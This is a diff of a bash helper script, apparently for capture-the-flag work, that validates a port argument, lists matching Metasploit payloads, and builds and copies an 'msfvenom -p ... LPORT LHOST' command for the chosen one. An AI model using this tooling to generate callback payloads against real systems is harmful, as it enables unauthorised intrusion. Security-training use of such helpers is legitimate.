@@ -12,11 +12,17 @@ do
 done
 }
 if [ "$2" == "" ]; then
-  usage
+  usage >&2
   exit 1
 fi
 source ctfenv.sh
 export LPORT=$1
+# Check to make sure first arg is a port number
+re='^[0-9]+$'
+if ! [[ $LPORT =~ $re ]] ; then
+   echo "$0: \"$LPORT\" is not a valid port" >&2; usage >&2; exit 1
+fi
+
 shift
 echo LPORT=$LPORT
 SEARCH=`search $*`
@@ -28,4 +34,20 @@ fi
 TMPFILE=`mktemp`
 echo cat $PAYLOADS $SEARCH > $TMPFILE
 chmod +x $TMPFILE
-$TMPFILE
+$TMPFILE | cut -c5- | cut -f1 -d" "
+cat $TMPFILE
+echo -------------------------------------------------------------------------
+echo --- Payloads found. Please select one:
+echo -------------------------------------------------------------------------
+read PAYLOAD
+echo 
+echo -------------------------------------------------------------------------
+echo Payload command copied to clipboard
+echo 
+echo   msfvenom -p $PAYLOAD LPORT=$LPORT LHOST=$LHOST
+echo -n msfvenom -p $PAYLOAD LPORT=$LPORT LHOST=$LHOST | xclip
+echo 
+echo Add formats, badchars, etc
+
+
+
